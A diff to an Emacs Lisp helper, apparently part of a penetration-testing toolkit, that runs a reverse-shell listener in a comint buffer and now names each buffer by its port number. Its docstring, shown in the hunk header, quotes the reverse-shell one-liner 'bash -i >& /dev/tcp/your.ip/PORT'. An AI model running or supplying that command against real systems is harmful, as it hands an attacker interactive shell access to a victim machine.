@@ -24,14 +24,15 @@ Run `hack/revshell' function and execute bash -i >& /dev/tcp/your.ip/PORT."
   (interactive "nPort Number: ")
   (let* ((revshell-program hack/revshell-executable)
          (revshell-parameters (append hack/revshell-parameters (list (int-to-string port))))
-         (buffer (comint-check-proc "revshell")))
+         (revshell-name (format "revshell:%d" port))
+         (buffer (comint-check-proc (format "*%s*" revshell-name))))
     (pop-to-buffer-same-window
      (if (or buffer (not (derived-mode-p 'revshell-mode))
              (comint-check-proc (current-buffer)))
-         (get-buffer-create (or buffer "*revshell*"))
+         (get-buffer-create (or buffer (format "*%s*" revshell-name)))
        (current-buffer)))
     (unless buffer
-      (apply 'make-comint-in-buffer "revshell" buffer
+      (apply 'make-comint-in-buffer revshell-name buffer
              revshell-program nil revshell-parameters)
       (revshell-mode))))
 
